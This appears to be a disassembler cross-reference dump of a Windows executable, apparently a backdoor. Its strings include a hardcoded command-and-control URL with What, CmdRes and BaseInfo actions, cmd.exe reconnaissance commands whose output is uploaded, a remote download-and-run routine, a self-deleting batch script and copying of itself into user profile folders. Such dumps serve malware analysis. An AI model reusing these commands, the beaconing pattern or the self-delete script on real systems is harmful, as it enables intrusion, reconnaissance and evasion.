reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x40187e	0x41904c	import	0x4017d0	KERNEL32.dll.SetLastError
0x4018bd	0x41905c	import	0x4017d0	KERNEL32.dll.GetSystemInfo
0x4018d5	0x419054	import	0x4017d0	KERNEL32.dll.VirtualAlloc
0x401969	0x41904c	import	0x4017d0	KERNEL32.dll.SetLastError
0x4019c6	0x41904c	import	0x4019b0	KERNEL32.dll.SetLastError
0x401a0f	0x41b590	string	0x4019b0	InitDll
0x401a34	0x41904c	import	0x4019b0	KERNEL32.dll.SetLastError
0x401a52	0x41904c	import	0x4019b0	KERNEL32.dll.SetLastError
0x401a78	0x41904c	import	0x4019b0	KERNEL32.dll.SetLastError
0x401afd	0x419040	import	0x401a90	KERNEL32.dll.VirtualFree
0x401b06	0x419044	import	0x401a90	KERNEL32.dll.GetProcessHeap
0x401b0d	0x41903c	import	0x401a90	KERNEL32.dll.HeapFree
0x4022b0	0x4022bd	string	0x4021d0	Ky\v}
0x40260d	0x419188	import	0x4025e0	WINHTTP.dll.WinHttpCloseHandle
0x4027fc	0x40280a	string	0x4025e0	3\t~p
0x40281d	0x40282b	string	0x4025e0	3҉~T blocks=Basic Latin,Cyrillic
0x40283e	0x40284c	string	0x4025e0	3ɉ~8 blocks=Basic Latin,Latin Extended-B
0x402985	0x402989	string	0x402880	VVVVP
0x40298e	0x41917c	import	0x402880	WINHTTP.dll.WinHttpOpen
0x40299a	0x419028	import	0x402880	KERNEL32.dll.GetLastError
0x4029dd	0x4191a0	import	0x402880	WINHTTP.dll.WinHttpSetTimeouts
0x402a8e	0x419170	import	0x402880	WINHTTP.dll.WinHttpCrackUrl
0x402ad5	0x41918c	import	0x402880	WINHTTP.dll.WinHttpConnect
0x402b23	0x419178	import	0x402880	WINHTTP.dll.WinHttpOpenRequest
0x402b5e	0x41919c	import	0x402880	WINHTTP.dll.WinHttpSetOption
0x402b98	0x419168	import	0x402880	WINHTTP.dll.WinHttpAddRequestHeaders
0x402ba2	0x419028	import	0x402880	KERNEL32.dll.GetLastError
0x402bb7	0x41b34c	string	0x402880	Cookie:
0x402c03	0x419168	import	0x402880	WINHTTP.dll.WinHttpAddRequestHeaders
0x402c0d	0x419028	import	0x402880	KERNEL32.dll.GetLastError
0x402caf	0x41919c	import	0x402880	WINHTTP.dll.WinHttpSetOption
0x402cd6	0x419028	import	0x402880	KERNEL32.dll.GetLastError
0x402cea	0x402d59	string	0x402880	jjjjjj
0x402d0d	0x419028	import	0x402880	KERNEL32.dll.GetLastError
0x402d21	0x402d59	string	0x402880	jjjjjj
0x402d43	0x402d59	string	0x402880	jjjjjj
0x402d45	0x419028	import	0x402880	KERNEL32.dll.GetLastError
0x402d51	0x402d59	string	0x402880	jjjjjj
0x402d6d	0x419194	import	0x402880	WINHTTP.dll.WinHttpSendRequest
0x402d9c	0x419198	import	0x402880	WINHTTP.dll.WinHttpGetIEProxyConfigForCurrentUser
0x402e3f	0x419174	import	0x402880	WINHTTP.dll.WinHttpGetProxyForUrl
0x402e59	0x41919c	import	0x402880	WINHTTP.dll.WinHttpSetOption
0x402e6a	0x419194	import	0x402880	WINHTTP.dll.WinHttpSendRequest
0x402e86	0x41908c	import	0x402880	KERNEL32.dll.GlobalFree
0x402e9b	0x41908c	import	0x402880	KERNEL32.dll.GlobalFree
0x402f66	0x41919c	import	0x402880	WINHTTP.dll.WinHttpSetOption
0x402f70	0x419028	import	0x402880	KERNEL32.dll.GetLastError
0x402f87	0x41908c	import	0x402880	KERNEL32.dll.GlobalFree
0x402f98	0x41908c	import	0x402880	KERNEL32.dll.GlobalFree
0x402fa9	0x41908c	import	0x402880	KERNEL32.dll.GlobalFree
0x402fe6	0x419190	import	0x402880	WINHTTP.dll.WinHttpWriteData
0x402ff0	0x419028	import	0x402880	KERNEL32.dll.GetLastError
0x402fff	0x419180	import	0x402880	WINHTTP.dll.WinHttpReceiveResponse
0x40300d	0x419184	import	0x402880	WINHTTP.dll.WinHttpQueryHeaders
0x403033	0x419028	import	0x402880	KERNEL32.dll.GetLastError
0x4030e8	0x41b360	string	0x402880	charset={[A-Za-z0-9\-_]+}
0x40313f	0x41b394	string	0x402880	Content-Length: {[0-9]+}
0x4031a6	0x41b3c8	string	0x402880	Location: {[0-9]+}
0x403204	0x41b3f0	string	0x402880	Set-Cookie:\b*{.+?}\n
0x403362	0x419184	import	0x402880	WINHTTP.dll.WinHttpQueryHeaders
0x403397	0x419028	import	0x402880	KERNEL32.dll.GetLastError
0x403478	0x419164	import	0x402880	WINHTTP.dll.WinHttpQueryDataAvailable
0x4034e1	0x41916c	import	0x402880	WINHTTP.dll.WinHttpReadData
0x40358c	0x419028	import	0x402880	KERNEL32.dll.GetLastError
0x403613	0x419020	import	0x402880	KERNEL32.dll.MultiByteToWideChar
0x40363f	0x419020	import	0x402880	KERNEL32.dll.MultiByteToWideChar
0x4036a8	0x419020	import	0x402880	KERNEL32.dll.MultiByteToWideChar
0x4036ea	0x41b434	string	0x402880	{<html>}
0x40375a	0x41b448	string	0x402880	{</html>}
0x4037d1	0x419028	import	0x402880	KERNEL32.dll.GetLastError
0x40380a	0x419188	import	0x402880	WINHTTP.dll.WinHttpCloseHandle
0x403817	0x419188	import	0x402880	WINHTTP.dll.WinHttpCloseHandle
0x403938	0x41b45c	string	0x4038e0	0123456789abcdef
0x403a74	0x41b478	string	0x4038e0	Content-Disposition: form-data; name="
0x403aa6	0x41bc80	string	0x4038e0	string too long
0x403ac0	0x41bc80	string	0x4038e0	string too long
0x403b45	0x41b4a0	string	0x4038e0	"; filename="
0x403b77	0x41bc80	string	0x4038e0	string too long
0x403bb5	0x41bc80	string	0x4038e0	string too long
0x403c64	0x41b4b4	string	0x4038e0	Content-Type: application/x-www-form-urlencoded\r\n\r\n
0x403c79	0x41b4e8	string	0x4038e0	\r\n--
0x403caa	0x41b4f0	string	0x4038e0	--\r\n
0x403ebd	0x41b500	string	0x403e10	Content-Length:
0x403f03	0x41b528	string	0x403e10	\r\nContent-Type: multipart/form-data; boundary=
0x404135	0x41b5d0	string	0x4040d0	myfile
0x40425d	0x41b5d8	string	0x4041f0	%I64d.rst
0x404395	0x419088	import	0x404310	KERNEL32.dll.GetTempPathW
0x4043b0	0x419064	import	0x404310	KERNEL32.dll.GetTempFileNameW
0x4043bd	0x41b5ec	string	0x404310	cmd.exe /c "hostname > %s"
0x4043e9	0x419068	import	0x404310	KERNEL32.dll.WaitForSingleObject
0x4043ef	0x419080	import	0x404310	KERNEL32.dll.TerminateProcess
0x404417	0x41902c	import	0x404310	KERNEL32.dll.CloseHandle
0x404424	0x41b624	string	0x404310	cmd.exe /c "whoami >> %s"
0x404472	0x41902c	import	0x404310	KERNEL32.dll.CloseHandle
0x40447f	0x41b658	string	0x404310	cmd.exe /c "ver >> %s"
0x4044cd	0x41902c	import	0x404310	KERNEL32.dll.CloseHandle
0x4044da	0x41b688	string	0x404310	cmd.exe /c "ipconfig -all >> %s"
0x404528	0x41902c	import	0x404310	KERNEL32.dll.CloseHandle
0x404535	0x41b6d0	string	0x404310	cmd.exe /c "ping www.google.com >> %s"
0x404583	0x41902c	import	0x404310	KERNEL32.dll.CloseHandle
0x404590	0x41b720	string	0x404310	cmd.exe /c "query user >> %s"
0x4045de	0x41902c	import	0x404310	KERNEL32.dll.CloseHandle
0x4045eb	0x41b75c	string	0x404310	cmd.exe /c "net user >> %s"
0x404639	0x41902c	import	0x404310	KERNEL32.dll.CloseHandle
0x404646	0x41b794	string	0x404310	cmd.exe /c "net view >> %s"
0x404694	0x41902c	import	0x404310	KERNEL32.dll.CloseHandle
0x4046a1	0x41b7d0	string	0x404310	cmd.exe /c "net view /domain >> %s"
0x4046ef	0x41902c	import	0x404310	KERNEL32.dll.CloseHandle
0x4046fc	0x41b818	string	0x404310	cmd.exe /c "reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" >> %s"
0x40474a	0x41902c	import	0x404310	KERNEL32.dll.CloseHandle
0x404757	0x41b8d8	string	0x404310	cmd.exe /c "tasklist /svc >> %s"
0x4047a5	0x41902c	import	0x404310	KERNEL32.dll.CloseHandle
0x4047b2	0x41b920	string	0x404310	cmd.exe /c "netstat -ano | find "TCP" >> %s"
0x404800	0x41902c	import	0x404310	KERNEL32.dll.CloseHandle
0x404900	0x41b980	string	0x404870	https://www.eye-watch.in/design/img/list.jsp
0x404905	0x41b9dc	string	0x404870	%s?action=What&u=%I64u
0x404b6a	0x419020	import	0x404870	KERNEL32.dll.MultiByteToWideChar
0x404b9f	0x41ba0c	string	0x404870	success
0x404bbb	0x41ba1c	string	0x404870	killkill
0x404bd1	0x41ba74	string	0x404870	http
0x404bdd	0x41915c	import	0x404870	SHLWAPI.dll.StrStrIW
0x404c45	0x419088	import	0x404870	KERNEL32.dll.GetTempPathW
0x404ce1	0x41ba80	string	0x404870	.mui
0x404d04	0x41907c	import	0x404870	KERNEL32.dll.GetFileAttributesW
0x404dc9	0x4191a8	import	0x404870	urlmon.dll.URLDownloadToFileW
0x404de7	0x419090	import	0x404870	KERNEL32.dll.CreateThread
0x404df2	0x41902c	import	0x404870	KERNEL32.dll.CloseHandle
0x404dfd	0x419070	import	0x404870	KERNEL32.dll.Sleep
0x404e0e	0x419028	import	0x404870	KERNEL32.dll.GetLastError
0x404e23	0x41b980	string	0x404870	https://www.eye-watch.in/design/img/list.jsp
0x404e28	0x41ba98	string	0x404870	%s?action=CmdRes&u=%I64u&err=exec-%d
0x404f5d	0x419070	import	0x404870	KERNEL32.dll.Sleep
0x404f70	0x41bc68	string	0x404870	invalid string position
0x404f7a	0x41bc80	string	0x404870	string too long
0x404f91	0x41b980	string	0x404870	https://www.eye-watch.in/design/img/list.jsp
0x404f96	0x41ba30	string	0x404870	%s?action=CmdRes&u=%I64u&err=kill
0x4050ac	0x419028	import	0x404870	KERNEL32.dll.GetLastError
0x4050b3	0x41bae4	string	0x404870	Error : %d\n
0x4050b8	0x409d71	string	0x404870	j\fh
0x405141	0x41906c	import	0x4050e0	KERNEL32.dll.GetTickCount
0x4051a8	0x41b980	string	0x4050e0	https://www.eye-watch.in/design/img/list.jsp
0x4051ad	0x41baf0	string	0x4050e0	%s?action=BaseInfo&u=%I64u
0x405264	0x41b980	string	0x4050e0	https://www.eye-watch.in/design/img/list.jsp
0x405269	0x41b9dc	string	0x4050e0	%s?action=What&u=%I64u
0x405355	0x41bb28	string	0x405340	SelfDeleting...
0x40535a	0x409d71	string	0x405340	j\fh
0x40541f	0x419084	import	0x405340	KERNEL32.dll.GetModuleFileNameW
0x405431	0x419088	import	0x405340	KERNEL32.dll.GetTempPathW
0x40547e	0x41bb50	string	0x405340	"%s" "%s"
0x4054aa	0x41bb70	string	0x405340	@echo off\r\n:del1\r\ndel /a %1\r\nif exist %1 goto del1\r\ndel /a %0
0x4054bb	0x40a02c	string	0x405340	j\fh@
0x40550d	0x41900c	import	0x405340	KERNEL32.dll.CreateProcessW
0x405690	0x419084	import	0x405530	KERNEL32.dll.GetModuleFileNameW
0x4056bc	0x419078	import	0x405530	KERNEL32.dll.GetVersionExW
0x4056db	0x41bbec	string	0x405530	%APPDATA%
0x4056e0	0x419094	import	0x405530	KERNEL32.dll.ExpandEnvironmentStringsW
0x405709	0x41bc00	string	0x405530	%s\%s\%s\%s\%s\%s\%s
0x405724	0x41bc2c	string	0x405530	%USERPROFILE%
0x405729	0x419094	import	0x405530	KERNEL32.dll.ExpandEnvironmentStringsW
0x40574e	0x41bc48	string	0x405530	%s\%s\%s\%s\%s
0x405777	0x419074	import	0x405530	KERNEL32.dll.CopyFileW
0x405adf	0x405b0a	string	0x4059d0	;}\bt\tW
0x405c7a	0x406770	string	0x405b90	;A\br\n
0x405ca9	0x406770	string	0x405b90	;A\br\n
0x405cc2	0x406770	string	0x405b90	;A\br\n
0x405d03	0x406770	string	0x405b90	;A\br\n
0x405d12	0x406770	string	0x405b90	;A\br\n
0x405d27	0x406770	string	0x405b90	;A\br\n
0x405d55	0x406770	string	0x405b90	;A\br\n
0x405d74	0x406770	string	0x405b90	;A\br\n
0x405d8d	0x406770	string	0x405b90	;A\br\n
0x405dab	0x406770	string	0x405b90	;A\br\n
0x405dca	0x406770	string	0x405b90	;A\br\n
0x405dec	0x406770	string	0x405b90	;A\br\n
0x405ee1	0x406770	string	0x405b90	;A\br\n
0x405f77	0x406770	string	0x405b90	;A\br\n
0x405ff5	0x406770	string	0x405b90	;A\br\n
0x40600b	0x406770	string	0x405b90	;A\br\n
0x406029	0x406770	string	0x405b90	;A\br\n
0x40604a	0x406770	string	0x405b90	;A\br\n
0x406060	0x406770	string	0x405b90	;A\br\n
0x40607e	0x406770	string	0x405b90	;A\br\n
0x4060b2	0x406770	string	0x405b90	;A\br\n
0x4060c8	0x406770	string	0x405b90	;A\br\n
0x4060f4	0x406770	string	0x405b90	;A\br\n
0x406113	0x406770	string	0x405b90	;A\br\n
0x406142	0x406770	string	0x405b90	;A\br\n
0x406165	0x406770	string	0x405b90	;A\br\n
0x4063e2	0x41bc68	string	0x4063d0	invalid string position
0x4064f1	0x41bc80	string	0x406480	string too long
0x406635	0x41bc90	string	0x406610	vector<T> too long
0x4066fc	0x406716	string	0x4066f0	;~\bw
0x4067bc	0x406801	string	0x406790	[_^]
0x406939	0x406956	string	0x406920	;^\bw
0x4069f3	0x41bc68	string	0x4069e0	invalid string position
0x406a11	0x41bc80	string	0x4069e0	string too long
0x406af0	0x41bc80	string	0x406a80	string too long
0x406bb7	0x41bc80	string	0x406b60	string too long
0x406c43	0x41bc68	string	0x406c30	invalid string position
0x406c61	0x41bc80	string	0x406c30	string too long
0x406d54	0x41bc80	string	0x406ce0	string too long
0x406dca	0x41bc68	string	0x406dc0	invalid string position
0x406e48	0x41bc80	string	0x406e40	string too long
0x406f48	0x41bc90	string	0x406f10	vector<T> too long
0x407124	0x406770	string	0x407060	;A\br\n
0x40714f	0x406770	string	0x407060	;A\br\n
0x40715c	0x406770	string	0x407060	;A\br\n
0x407251	0x41bc68	string	0x407240	invalid string position
0x407288	0x41bc80	string	0x407240	string too long
0x407325	0x41bc80	string	0x407320	string too long
0x40764e	0x406770	string	0x407540	;A\br\n
0x407660	0x406770	string	0x407540	;A\br\n
0x40766d	0x406770	string	0x407540	;A\br\n
0x407680	0x406770	string	0x407540	;A\br\n
0x40768d	0x406770	string	0x407540	;A\br\n
0x40769a	0x406770	string	0x407540	;A\br\n
0x40778a	0x406770	string	0x407540	;A\br\n
0x407797	0x406770	string	0x407540	;A\br\n
0x4077a6	0x406770	string	0x407540	;A\br\n
0x4077b2	0x406770	string	0x407540	;A\br\n
0x4077d5	0x406770	string	0x407540	;A\br\n
0x4077e8	0x406770	string	0x407540	;A\br\n
0x407864	0x406770	string	0x407540	;A\br\n
0x407888	0x406770	string	0x407540	;A\br\n
0x407895	0x406770	string	0x407540	;A\br\n
0x4078d2	0x4078f5	string	0x4078c0	;~\bw\a;~
0x40793a	0x41bc68	string	0x407930	invalid string position
0x407bf0	0x407c58	string	0x407b60	_^[]
0x407c10	0x406770	string	0x407b60	;A\br\n
0x407c63	0x406770	string	0x407b60	;A\br\n
0x407ce6	0x406770	string	0x407b60	;A\br\n
0x407d1f	0x406770	string	0x407b60	;A\br\n
0x407da8	0x407db5	string	0x407d90	;s\br\n
0x407e92	0x406770	string	0x407d90	;A\br\n
0x407eb9	0x406770	string	0x407d90	;A\br\n
0x407ec5	0x406770	string	0x407d90	;A\br\n
0x407f1d	0x407f46	string	0x407ef0	;{\br\n
0x40811e	0x406770	string	0x407fe0	;A\br\n
0x40812a	0x406770	string	0x407fe0	;A\br\n
0x40814a	0x406770	string	0x407fe0	;A\br\n
0x408156	0x406770	string	0x407fe0	;A\br\n
0x408177	0x406770	string	0x407fe0	;A\br\n
0x408833	0x41903c	import	0x40881d	KERNEL32.dll.HeapFree
0x408845	0x419028	import	0x40881d	KERNEL32.dll.GetLastError
0x40889c	0x419038	import	0x408857	KERNEL32.dll.HeapAlloc
0x408959	0x40b85a	string	0x40891e	j\fh0
0x408ab0	0x408ac9	string	0x408a9e	9E\ft
0x408d39	0x4190cc	import	0x408cfa	KERNEL32.dll.HeapReAlloc
0x408dbb	0x40bda3	string	0x408db2	j\fhP
0x4090b3	0x419204	string	0x40908f	Unknown exception
0x409b94	0x409bad	string	0x409afd	9M\bs
0x40a0ab	0x4190d0	import	0x40a0a0	KERNEL32.dll.GetSystemTimeAsFileTime
0x40a213	0x4190d8	import	0x40a1cf	KERNEL32.dll.HeapSetInformation
0x40a29d	0x4190d4	import	0x40a1cf	KERNEL32.dll.GetCommandLineW
0x40a41e	0x4190e8	import	0x40a365	KERNEL32.dll.IsDebuggerPresent
0x40a433	0x4190e4	import	0x40a365	KERNEL32.dll.SetUnhandledExceptionFilter
0x40a43e	0x4190e0	import	0x40a365	KERNEL32.dll.UnhandledExceptionFilter
0x40a45a	0x4190dc	import	0x40a365	KERNEL32.dll.GetCurrentProcess
0x40a461	0x419080	import	0x40a365	KERNEL32.dll.TerminateProcess
0x40a4fd	0x4190ec	import	0x40a4f4	KERNEL32.dll.HeapCreate
0x40a517	0x41924c	string	0x40a512	mscoree.dll
0x40a51c	0x4190f0	import	0x40a512	KERNEL32.dll.GetModuleHandleW
0x40a526	0x41923c	string	0x40a512	CorExitProcess
0x40a52c	0x419050	import	0x40a512	KERNEL32.dll.GetProcAddress
0x40a54e	0x4190f4	import	0x40a53d	KERNEL32.dll.ExitProcess
0x40a5a5	0x40a5b6	string	0x40a59a	;u\fr
0x40a699	0x4190f8	import	0x40a655	KERNEL32.dll.DecodePointer
0x40a88d	0x419c1c	string	0x40a823	Runtime Error!\n\nProgram:
0x40a8bf	0x419084	import	0x40a823	KERNEL32.dll.GetModuleFileNameW
0x40a8ce	0x419bec	string	0x40a823	<program name unknown>
0x40a971	0x4190fc	import	0x40a823	KERNEL32.dll.GetStdHandle
0x40a9bd	0x419014	import	0x40a823	KERNEL32.dll.WriteFile
0x40aa25	0x4190f8	import	0x40aa1a	KERNEL32.dll.DecodePointer
0x40aa44	0x419100	import	0x40aa42	KERNEL32.dll.EncodePointer
0x40aa4b	0x419104	import	0x40aa42	KERNEL32.dll.TlsAlloc
0x40aa5d	0x419108	import	0x40aa54	KERNEL32.dll.TlsGetValue
0x40aa6f	0x4190f8	import	0x40aa54	KERNEL32.dll.DecodePointer
0x40aa7e	0x41910c	import	0x40aa54	KERNEL32.dll.TlsSetValue
0x40aa99	0x4190f8	import	0x40aa88	KERNEL32.dll.DecodePointer
0x40aab3	0x419110	import	0x40aa88	KERNEL32.dll.TlsFree
0x40aad1	0x419c50	string	0x40aac5	KERNEL32.DLL
0x40aad6	0x4190f0	import	0x40aac5	KERNEL32.dll.GetModuleHandleW
0x40ab17	0x419114	import	0x40aac5	KERNEL32.dll.InterlockedIncrement
0x40ab7d	0x419028	import	0x40ab79	KERNEL32.dll.GetLastError
0x40abb9	0x4190f8	import	0x40ab79	KERNEL32.dll.DecodePointer
0x40abcf	0x419118	import	0x40ab79	KERNEL32.dll.GetCurrentThreadId
0x40abe7	0x41904c	import	0x40ab79	KERNEL32.dll.SetLastError
0x40acaa	0x41911c	import	0x40abf2	KERNEL32.dll.InterlockedDecrement
0x40ad3e	0x419c50	string	0x40ad3b	KERNEL32.DLL
0x40ad43	0x4190f0	import	0x40ad3b	KERNEL32.dll.GetModuleHandleW
0x40ad59	0x419050	import	0x40ad3b	KERNEL32.dll.GetProcAddress
0x40ad5f	0x419c8c	string	0x40ad3b	FlsAlloc
0x40ad67	0x419c80	string	0x40ad3b	FlsGetValue
0x40ad74	0x419c74	string	0x40ad3b	FlsSetValue
0x40ad81	0x419c6c	string	0x40ad3b	FlsFree
0x40ad95	0x41910c	import	0x40ad3b	KERNEL32.dll.TlsSetValue
0x40addc	0x419104	import	0x40ad3b	KERNEL32.dll.TlsAlloc
0x40ae0c	0x419100	import	0x40ad3b	KERNEL32.dll.EncodePointer
0x40ae49	0x4190f8	import	0x40ad3b	KERNEL32.dll.DecodePointer
0x40ae9b	0x419118	import	0x40ad3b	KERNEL32.dll.GetCurrentThreadId
0x40af6a	0x419120	import	0x40af49	KERNEL32.dll.GetCPInfo
0x40b1a6	0x419128	import	0x40b17d	KERNEL32.dll.GetOEMCP
0x40b1c9	0x419124	import	0x40b17d	KERNEL32.dll.GetACP
0x40b26c	0x41912c	import	0x40b1f9	KERNEL32.dll.IsValidCodePage
0x40b27f	0x419120	import	0x40b1f9	KERNEL32.dll.GetCPInfo
0x40b458	0x41911c	import	0x40b3e2	KERNEL32.dll.InterlockedDecrement
0x40b477	0x419114	import	0x40b3e2	KERNEL32.dll.InterlockedIncrement
0x40b50f	0x41911c	import	0x40b3e2	KERNEL32.dll.InterlockedDecrement
0x40b5a1	0x419114	import	0x40b59a	KERNEL32.dll.InterlockedIncrement
0x40b63c	0x41911c	import	0x40b629	KERNEL32.dll.InterlockedDecrement
0x40bb0d	0x4190e8	import	0x40ba23	KERNEL32.dll.IsDebuggerPresent
0x40bb17	0x4190e4	import	0x40ba23	KERNEL32.dll.SetUnhandledExceptionFilter
0x40bb24	0x4190e0	import	0x40ba23	KERNEL32.dll.UnhandledExceptionFilter
0x40bb62	0x4190dc	import	0x40bb4c	KERNEL32.dll.GetCurrentProcess
0x40bb69	0x419080	import	0x40bb4c	KERNEL32.dll.TerminateProcess
0x40bb7c	0x4190f8	import	0x40bb71	KERNEL32.dll.DecodePointer
0x40bd8a	0x419130	import	0x40bd4e	KERNEL32.dll.GetStringTypeW
0x40c84c	0x4190f8	import	0x40c153	KERNEL32.dll.DecodePointer
0x40ce6a	0x40ceb5	string	0x40cd60	X^_]ú blocks=Basic Latin,Latin-1 Supplement
0x40ce8f	0x40ceb5	string	0x40cd60	X^_]ú blocks=Basic Latin,Latin-1 Supplement
0x40ceaa	0x40ceb5	string	0x40cd60	X^_]ú blocks=Basic Latin,Latin-1 Supplement
0x40cef0	0x419134	import	0x40cd60	KERNEL32.dll.IsProcessorFeaturePresent
0x40d00d	0x419138	import	0x40cfd5	KERNEL32.dll.EnterCriticalSection
0x40d040	0x419138	import	0x40d016	KERNEL32.dll.EnterCriticalSection
0x40d07c	0x41913c	import	0x40d048	KERNEL32.dll.LeaveCriticalSection
0x40d0ab	0x41913c	import	0x40d084	KERNEL32.dll.LeaveCriticalSection
0x40d84f	0x4190f8	import	0x40d183	KERNEL32.dll.DecodePointer
0x40de39	0x40e4a2	string	0x40ddb2	UVWS
0x40df82	0x419038	import	0x40df3f	KERNEL32.dll.HeapAlloc
0x40e179	0x40e17e	string	0x40dfc1	f9>t
0x40e19e	0x40e1a3	string	0x40dfc1	f9>t
0x40e1d7	0x41a0f8	string	0x40dfc1	UTF-16LE
0x40e1f6	0x41a10c	string	0x40dfc1	UNICODE
0x40e336	0x419140	import	0x40e27a	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x40e35f	0x419138	import	0x40e27a	KERNEL32.dll.EnterCriticalSection
0x40e4db	0x40e4e6	string	0x40e4d2	_^[]
0x40ec74	0x4190f8	import	0x40e5ac	KERNEL32.dll.DecodePointer
0x40f185	0x419148	import	0x40f160	KERNEL32.dll.LCMapStringW
0x40f613	0x41902c	import	0x40f5c1	KERNEL32.dll.CloseHandle
0x40f61d	0x419028	import	0x40f5c1	KERNEL32.dll.GetLastError
0x40f88e	0x40f8a1	string	0x40f828	9}\bu
0x40f980	0x4190f8	import	0x40f978	KERNEL32.dll.DecodePointer
0x40f9ff	0x419100	import	0x40f978	KERNEL32.dll.EncodePointer
0x40fa0d	0x419100	import	0x40f978	KERNEL32.dll.EncodePointer
0x40fa3f	0x419100	import	0x40f978	KERNEL32.dll.EncodePointer
0x40faf4	0x41914c	import	0x40fab2	KERNEL32.dll.RaiseException
0x40fb45	0x4190e4	import	0x40fb00	KERNEL32.dll.SetUnhandledExceptionFilter
0x40fb9a	0x40fc94	string	0x40fb4e	_^]Ë blocks=Basic Latin,Latin-1 Supplement
0x40fbab	0x40fc94	string	0x40fb4e	_^]Ë blocks=Basic Latin,Latin-1 Supplement
0x40feea	0x419084	import	0x40feca	KERNEL32.dll.GetModuleFileNameW
0x40ff7b	0x419154	import	0x40ff78	KERNEL32.dll.GetEnvironmentStringsW
0x40ff90	0x40ffa2	string	0x40ff78	S+ƍX blocks=Basic Latin,Latin Extended-B
0x40ffb7	0x419150	import	0x40ff78	KERNEL32.dll.FreeEnvironmentStringsW
0x40ffdd	0x4190bc	import	0x40ffd0	KERNEL32.dll.GetStartupInfoW
0x410011	0x410049	string	0x40ffd0	SWf9M
0x4100e1	0x410085	string	0x40ffd0	j@j
0x410110	0x4190c0	import	0x40ffd0	KERNEL32.dll.GetFileType
0x410146	0x419140	import	0x40ffd0	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x41019a	0x4190fc	import	0x40ffd0	KERNEL32.dll.GetStdHandle
0x4101ac	0x4190c0	import	0x40ffd0	KERNEL32.dll.GetFileType
0x4101da	0x419140	import	0x40ffd0	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x410203	0x4190c8	import	0x40ffd0	KERNEL32.dll.SetHandleCount
0x410298	0x4190d0	import	0x410261	KERNEL32.dll.GetSystemTimeAsFileTime
0x4102a4	0x4190b0	import	0x410261	KERNEL32.dll.GetCurrentProcessId
